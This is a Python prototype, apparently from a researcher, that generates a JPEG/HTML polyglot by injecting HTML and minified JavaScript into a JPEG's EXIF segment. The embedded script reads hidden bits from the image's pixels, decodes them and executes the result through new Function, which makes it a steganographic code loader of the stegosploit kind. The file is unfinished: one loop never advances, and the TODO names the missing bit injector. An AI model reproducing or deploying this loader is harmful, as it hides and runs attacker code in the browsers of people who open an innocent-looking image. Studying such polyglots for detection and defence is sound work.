'''
jpg.py
<alexmichael@uchicago.edu>

Description: Prototype of polyglot generator.

TODO:
	- [ ] Build the least significant bit layer injector
'''


import struct
import re
import random


class Polyglot:
	def __init__(self):
		pass

	def check_exif(prevByte, curByte):
		if 0xff in prevByte and 0xe0 in curByte:
			return True
		elif 0xff in prevByte and 0xe1 in curByte:
			return True
		elif 0xff in prevByte and 0xe2 in curByte:
			return True
		elif 0xff in prevByte and 0xe3 in curByte:
			return True
		elif 0xff in prevByte and 0xe4 in curByte:
			return True
		elif 0xff in prevByte and 0xe5 in curByte:
			return True
		elif 0xff in prevByte and 0xe6 in curByte:
			return True
		elif 0xff in prevByte and 0xe7 in curByte:
			return True
		elif 0xff in prevByte and 0xe8 in curByte:
			return True
		elif 0xff in prevByte and 0xe9 in curByte:
			return True
		else:
			return False

	def genRandomHTMLChar():
		while True:
			x = random.randint(0,255)
			if x != 0 and x!=ord('<') and x!=ord('>') and x!=ord('/'):
				return x

	def create(debug=True):
		infile = open('butterfly.jpg','rb')
		outfile = open('out2.html','wb')

		prevByte = infile.read(2)
		outfile.write(prevByte)

		while True:
			curByte = infile.read(1)
			if not curByte:
				break

			# Write the 
			if Polyglot.check_exif(prevByte, curByte):
				outfile.write(curByte)
				exifLen = struct.unpack('>H',infile.read(2))[0]-2	# convert exif length

				if debug:
					print(struct.pack('>H', 0x2f2a))
				outfile.write(struct.pack('>H', 0x2f2a))	# set the exif header to 0
				exifData = infile.read(exifLen)				# write the exif header to the file
				outfile.write(exifData)

				decoder=b"""<head><script>var bL=2,eC=3,gr=3;function i0(){px.onclick=dID}function dID(){var b=document.createElement("canvas");px.parentNode.insertBefore(b,px);b.width=px.width;b.height=px.height;var m=b.getContext("2d");m.drawImage(px,0,0);px.parentNode.removeChild(px);var f=m.getImageData(0,0,b.width,b.height).data;var h=[],j=0,g=0;var c=function(p,o,u)\{n=(u*b.width+o)*4;var z=1<<bL;var s=(p[n]&z)>>bL;var q=(p[n+1]&z)>>bL;var a=(p[n+2]&z)>>bL;var t=Math.round((s+q+a)/3);switch(eC){case 0:t=s;break;case 1:t=q;break;case 2:t=a;break;}return(String.fromCharCode(t+48))};var k=function(a)\{for(var q=0,o=0;o<a*8;o++)\{h[q++]=c(f,j,g);j+=gr;if(j>=b.width){j=0;g+=gr\}\}};k(6);var d=parseInt(bTS(h.join("")));k(d);try{CollectGarbage()}catch(e){}exc(bTS(h.join("")))}function bTS(b){var a="";for(i=0;i<b.length;i+=8)a+=String.fromCharCode(parseInt(b.substr(i,8),2));return(a)}function exc(b){var a=setTimeout((new Function(b)),100)}window.onload=i0;</script><style>body{visibility:hidden;} .s{visibility:visible;position:absolute;top:15px;left:10px;}</style></head><body><div class=s><img id=px src="#"></div></body></html>"""
				html = b'<!doctype html><html><!--'
				content = b'--><body><img src="."><script charset="ISO-8859-1">alert("code")</script></html><!--'
				content = b'-->'+decoder+b'<!--'
				paddingLen = 0x2f2a - len(content) - len(html) - exifLen - 2
				randomLength = random.randint(0,paddingLen)
				padding = b''
				for i in range(paddingLen):
					x = Polyglot.genRandomHTMLChar()
					padding += bytes([x])

				prePadding = padding[0:randomLength]
				postPadding = padding[randomLength:]

				finalContent = html + prePadding + content + postPadding
				outfile.write(finalContent)				# write payload into the exif
				curByte = infile.read(1)
				

			# Define Quantization Table(s) 
			if 0xff in prevByte and 0xdb in curByte:
				if debug:
					print('Define Quantization Tables')
				dqtLen = struct.unpack('>H',infile.read(2))[0]
				print(infile.read(dqtLen-2))
				infile.seek(-(dqtLen),1)
				print()


			# Frame Header:
			#
			# Indicates that this is a baseline DCT-based JPEG, and 
			# specifies the width, height, number of components, and 
			# component subsampling (e.g., 4:2:0) 
			if 0xff in prevByte and 0xc0 in curByte:
				frameHeaderLen = struct.unpack('>H',infile.read(2))[0]
				data = infile.read(frameHeaderLen-2)
				infile.seek(-(frameHeaderLen),1)
				if debug:
					print('Frame header')
					print(data,'\n')
				# http://lad.dsc.ufcg.edu.br/multimidia/jpegmarker.pdf

			# Frame Header:
			#
			# Indicates that this is a progressive DCT-based JPEG, and 
			# specifies the width, height, number of components, and 
			# component subsampling (e.g., 4:2:0). 
			if 0xff in prevByte and 0xc2 in curByte:
				frameHeaderLen = struct.unpack('>H',infile.read(2))[0]
				data = infile.read(frameHeaderLen-2)
				infile.seek(-(frameHeaderLen),1)
				if debug:
					print('Frame header')
					print(data,'\n')

			# Start Huffman tables
			if 0xff in prevByte and 0xc4 in curByte:
				huffmanTableLen = struct.unpack('>H',infile.read(2))[0]
				data = infile.read(huffmanTableLen-2)
				infile.seek(-(huffmanTableLen),1)
				if debug:
					print('Start Huffman table')
					print(data,'\n')

			# Start of scan (SOS)
			if 0xff in prevByte and 0xda in curByte:
				sosLen = struct.unpack('>H',infile.read(2))[0]
				data = infile.read(sosLen-2)
				infile.seek(-(sosLen),1)
				if debug:
					print('Start of scan (SOS)')
					print(data,'\n')
				print('scanning...\n')


			# NOTE: The actual image data is between the SOS and 
			# the end of frame marker


			# End of frame marker
			if 0xff in prevByte and 0xd9 in curByte:
				print(prevByte, curByte)
				print('end')


			outfile.write(curByte)
			prevByte = curByte

		# end all content
		outfile.write(b'\x2a\x2f -->')
		
		outfile.close()
		infile.close()

	def bits(debug=True):
		infile = open('out2.jpg','rb')

		prevByte = infile.read(1)
		while True:
			curByte = infile.read(1)
			if not curByte:
				break

			# Start of scan (SOS)
			if 0xff in prevByte and 0xda in curByte:
				sosLen = struct.unpack('>H',infile.read(2))[0]
				data = infile.read(sosLen-2)
				if debug:
					print('Start of scan (SOS)')
					print(data,'\n')
				infile.seek(-2,1)
				break

		while True:




			# NOTE: The actual image data is between the SOS and 
			# the end of frame marker


			# End of frame marker
			if 0xff in prevByte and 0xd9 in curByte:
				print(prevByte, curByte)
				print('end')

			prevByte = curByte

		infile.close()





def test():
	var= b'\xff\xd9'
	if 0xff in var:
		print(var)

def read(fname='out2.jpg'):
	file = open(fname, 'rb')
	while True:
		data = file.read(16)
		if not data:
			break
		print(data)

def main():
	# Polyglot.create()
	Polyglot.bits()

if __name__ == '__main__':
	main()
	# read()
	# test()